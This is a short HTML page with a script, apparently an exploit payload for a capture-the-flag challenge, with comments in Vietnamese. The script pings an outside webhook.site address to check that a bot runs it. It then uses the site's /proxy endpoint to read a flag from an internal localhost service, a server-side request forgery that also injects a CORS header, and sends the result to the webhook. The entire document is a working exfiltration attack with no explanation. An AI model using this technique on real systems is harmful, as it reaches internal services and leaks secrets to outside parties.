<!DOCTYPE html>
<html>
<head>
<title>a</title>
</head>
<body>
<script>

const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";

// 1️⃣ ping trước để check bot chạy JS
fetch("/proxy?url=" + encodeURIComponent(webhook + "/?stage=bot-start"));

// 2️⃣ lấy flag
fetch("/proxy?url=http://localhost:8080/flag&mirror=Access-Control-Allow-Origin:*")
.then(r => r.text())
.then(flag => {

    // 3️⃣ gửi flag qua proxy
    fetch("/proxy?url=" + encodeURIComponent(webhook + "/?flag=" + encodeURIComponent(flag)));

});

</script>
</body>
</html>
